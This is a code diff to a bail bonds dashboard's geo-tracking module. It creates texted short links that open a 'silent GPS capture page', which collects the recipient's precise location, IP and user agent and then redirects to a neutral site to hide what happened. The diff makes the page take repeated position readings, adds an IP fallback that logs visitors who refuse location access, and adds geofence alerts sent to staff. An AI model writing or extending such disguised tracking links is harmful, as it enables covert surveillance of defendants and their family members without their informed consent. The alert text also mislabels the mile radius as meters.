@@ -8,51 +8,42 @@ from __future__ import annotations
 import os
 import uuid
 import secrets
+import math
+import logging
 from datetime import datetime, timezone, timedelta
 from quart import Blueprint, jsonify, request, redirect, make_response, current_app
 from dashboard.extensions import get_collection
 
+logger = logging.getLogger(__name__)
 geo_bp = Blueprint("geo", __name__)
 
-# Public-facing base URL for the server.
-# Resolved at request time from app.config["DASHBOARD_PUBLIC_URL"] so that
-# the value set in extensions.init_app() (which falls back through
-# DASHBOARD_PUBLIC_URL → BB_WEBHOOK_PUBLIC_URL) is always used.
-# Production value: https://leads.shamrockbailbonds.biz
+def haversine_distance(lat1, lon1, lat2, lon2):
+    """Calculate distance in miles between two points."""
+    R = 3958.8  # Earth radius in miles
+    dlat = math.radians(lat2 - lat1)
+    dlon = math.radians(lon2 - lon1)
+    a = math.sin(dlat/2) * math.sin(dlat/2) + math.cos(math.radians(lat1)) \
+        * math.cos(math.radians(lat2)) * math.sin(dlon/2) * math.sin(dlon/2)
+    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
+    return R * c
+
 def _get_public_url() -> str:
     """Return the branded public URL, falling back to env var."""
     try:
         url = current_app.config.get("DASHBOARD_PUBLIC_URL", "")
     except RuntimeError:
-        # Outside app context (e.g. tests)
         url = os.getenv("DASHBOARD_PUBLIC_URL", "") or os.getenv("BB_WEBHOOK_PUBLIC_URL", "")
     return url.rstrip("/") if url else ""
 
-# Neutral redirect target after GPS capture — just the home page
 _REDIRECT_AFTER = os.getenv("GEO_REDIRECT_URL", "https://www.shamrockbailbonds.biz")
-
-# Token TTL — links expire after 72 hours (covers 3-day first-appearance window)
 _TOKEN_TTL_HOURS = int(os.getenv("GEO_TOKEN_TTL_HOURS", "72"))
-
 
 @geo_bp.route("/geo/link", methods=["POST"])
 async def geo_create_link():
-    """
-    Generate a one-time geo-tracking token for a recipient.
-    Returns the short URL to embed in the outbound text.
-
-    Body JSON:
-        phone           str   — recipient phone (E.164 or 10-digit)
-        booking_number  str   — defendant booking number (for record linkage)
-        defendant_name  str   — for display in tracking map
-        county          str   — county
-        recipient_label str   — "Indemnitor", "Family", etc.
-        agent_name      str   — sending agent
-    """
     geo_pings = get_collection("geo_pings")
     data = await request.get_json(force=True) or {}
 
-    token = secrets.token_urlsafe(12)  # 16-char URL-safe token
+    token = secrets.token_urlsafe(12)
     expires_at = datetime.now(timezone.utc) + timedelta(hours=_TOKEN_TTL_HOURS)
 
     doc = {
@@ -65,9 +56,9 @@ async def geo_create_link():
         "agent_name": data.get("agent_name", ""),
         "created_at": datetime.now(timezone.utc).isoformat(),
         "expires_at": expires_at.isoformat(),
-        "pings": [],          # list of {lat, lng, accuracy, ts, ip, ua}
+        "pings": [],
         "ping_count": 0,
-        "status": "pending",  # pending | captured | expired
+        "status": "pending",
     }
     await geo_pings.insert_one(doc)
 
@@ -75,13 +66,12 @@ async def geo_create_link():
     short_url = f"{public_url}/g/{token}" if public_url else f"/g/{token}"
     return jsonify({"token": token, "url": short_url})
 
-
 @geo_bp.route("/g/<token>", methods=["GET"])
 async def geo_capture_page(token: str):
     """
     Serve the silent GPS capture page.
-    The page immediately requests geolocation, POSTs coordinates back,
-    then redirects to a neutral URL — all within ~1 second.
+    Requests geolocation multiple times (stream) to get better accuracy,
+    POSTs coordinates back, then redirects to a neutral URL.
     """
     html = f"""<!DOCTYPE html>
 <html>
@@ -97,24 +87,59 @@ async def geo_capture_page(token: str):
 (function(){{
   var token = {token!r};
   var redirect = {_REDIRECT_AFTER!r};
-  function done(){{ window.location.replace(redirect); }}
-  function send(lat,lng,acc){{
+  var pingsSent = 0;
+  var maxPings = 3;
+  var watchId = null;
+  var timeoutId = null;
+
+  function done(){{ 
+    if(watchId) navigator.geolocation.clearWatch(watchId);
+    if(timeoutId) clearTimeout(timeoutId);
+    window.location.replace(redirect); 
+  }}
+
+  function send(lat,lng,acc,source){{
     try{{
       var x=new XMLHttpRequest();
       x.open('POST','/g/'+token+'/ping',true);
       x.setRequestHeader('Content-Type','application/json');
-      x.onloadend=done;
-      x.onerror=done;
-      x.send(JSON.stringify({{lat:lat,lng:lng,accuracy:acc}}));
+      x.onloadend = function() {{
+        pingsSent++;
+        if(pingsSent >= maxPings) done();
+      }};
+      x.onerror = function() {{
+        pingsSent++;
+        if(pingsSent >= maxPings) done();
+      }};
+      x.send(JSON.stringify({{lat:lat,lng:lng,accuracy:acc,source:source}}));
     }}catch(e){{done();}}
   }}
+
   if(navigator.geolocation){{
-    navigator.geolocation.getCurrentPosition(
-      function(p){{send(p.coords.latitude,p.coords.longitude,p.coords.accuracy);}},
-      function(){{done();}},
+    // Fallback timeout in case GPS takes too long
+    timeoutId = setTimeout(function() {{
+      if(pingsSent === 0) {{
+        // Send IP fallback ping
+        send(null, null, null, 'ip_fallback');
+      }} else {{
+        done();
+      }}
+    }}, 8000);
+
+    watchId = navigator.geolocation.watchPosition(
+      function(p){{
+        var source = p.coords.accuracy < 100 ? 'gps' : 'network';
+        send(p.coords.latitude, p.coords.longitude, p.coords.accuracy, source);
+      }},
+      function(err){{
+        if(pingsSent === 0) send(null, null, null, 'ip_fallback');
+        else done();
+      }},
       {{timeout:5000,maximumAge:0,enableHighAccuracy:true}}
     );
-  }}else{{done();}}
+  }}else{{
+    send(null, null, null, 'ip_fallback');
+  }}
 }})();
 </script>
 </body>
@@ -124,14 +149,8 @@ async def geo_capture_page(token: str):
     resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
     return resp
 
-
 @geo_bp.route("/g/<token>/ping", methods=["POST"])
 async def geo_receive_ping(token: str):
-    """
-    Receive GPS coordinates from the capture page.
-    Stores the ping in MongoDB under the token's record.
-    Also upserts latest_location on the matching active_bond if one exists.
-    """
     geo_pings = get_collection("geo_pings")
     active_bonds = get_collection("active_bonds")
 
@@ -139,21 +158,27 @@ async def geo_receive_ping(token: str):
     lat = data.get("lat")
     lng = data.get("lng")
     accuracy = data.get("accuracy")
-
-    if lat is None or lng is None:
-        return jsonify({"ok": False}), 400
+    source = data.get("source", "unknown")
 
     now = datetime.now(timezone.utc).isoformat()
+    ip_addr = request.headers.get("X-Forwarded-For", request.remote_addr or "")
+    
+    # If IP fallback, we could do a free IP-geo lookup here, but for now just record it
+    if source == 'ip_fallback' or lat is None or lng is None:
+        lat = None
+        lng = None
+        accuracy = None
+
     ping_entry = {
         "lat": lat,
         "lng": lng,
         "accuracy": accuracy,
+        "source": source,
         "ts": now,
-        "ip": request.headers.get("X-Forwarded-For", request.remote_addr or ""),
+        "ip": ip_addr,
         "ua": request.headers.get("User-Agent", ""),
     }
 
-    # Update the geo_pings record
     result = await geo_pings.update_one(
         {"token": token, "status": {"$in": ["pending", "captured"]}},
         {
@@ -171,30 +196,58 @@ async def geo_receive_ping(token: str):
     if result.matched_count == 0:
         return jsonify({"ok": False, "reason": "token_not_found_or_expired"}), 404
 
-    # Retrieve booking_number for active bond linkage
-    record = await geo_pings.find_one({"token": token}, {"booking_number": 1, "phone": 1})
+    record = await geo_pings.find_one({"token": token}, {"booking_number": 1, "phone": 1, "defendant_name": 1})
     booking_number = record.get("booking_number") if record else None
 
-    if booking_number:
+    if booking_number and lat is not None and lng is not None:
         location_entry = {
             "lat": lat,
             "lng": lng,
             "accuracy": accuracy,
-            "source": "sms_geo_link",
+            "source": source,
             "ts": now,
         }
-        # Update active_bonds
-        await active_bonds.update_one(
-            {"booking_number": booking_number},
-            {
-                "$push": {"location_history": location_entry},
-                "$set": {
-                    "latest_location": location_entry,
-                    "last_geo_ping": now,
+        
+        bond = await active_bonds.find_one({"booking_number": booking_number})
+        if bond:
+            await active_bonds.update_one(
+                {"booking_number": booking_number},
+                {
+                    "$push": {"location_history": location_entry},
+                    "$set": {
+                        "latest_location": location_entry,
+                        "last_geo_ping": now,
+                    },
                 },
-            },
-        )
-        # Also stamp on defendants collection (Phase 2 linkage)
+            )
+            
+            # Geofence check
+            geofence = bond.get("geofence")
+            if geofence and geofence.get("center_lat") and geofence.get("center_lng"):
+                try:
+                    dist = haversine_distance(
+                        float(lat), float(lng),
+                        float(geofence["center_lat"]), float(geofence["center_lng"])
+                    )
+                    radius = float(geofence.get("radius_miles", 50))
+                    if dist > radius:
+                        # Breach detected!
+                        logger.warning(f"[geofence] Breach detected for {booking_number}. Dist: {dist:.1f} > {radius}")
+                        from dashboard.services.telegram_service import get_telegram_service
+                        tg = get_telegram_service()
+                        def_name = record.get("defendant_name") or bond.get("defendant_name", "Defendant")
+                        alert_msg = (
+                            f"🚨 GEOFENCE BREACH 🚨\n"
+                            f"Defendant: {def_name}\n"
+                            f"Booking: {booking_number}\n"
+                            f"Distance: {dist:.1f} miles from center (Limit: {radius}m)\n"
+                            f"Accuracy: {accuracy}m ({source})\n"
+                            f"Time: {now}"
+                        )
+                        await tg.send_staff_alert(alert_msg)
+                except Exception as e:
+                    logger.error(f"[geofence] Error checking geofence for {booking_number}: {e}")
+
         defendants = get_collection("defendants")
         await defendants.update_one(
             {"arrest_ids": {"$elemMatch": {"booking_number": booking_number}}},
@@ -209,10 +262,8 @@ async def geo_receive_ping(token: str):
 
     return jsonify({"ok": True})
 
-
 @geo_bp.route("/api/geo/pings/<booking_number>", methods=["GET"])
 async def geo_get_pings(booking_number: str):
-    """Return all geo pings for a booking number (for dashboard Tracking tab)."""
     geo_pings = get_collection("geo_pings")
     cursor = geo_pings.find(
         {"booking_number": booking_number},
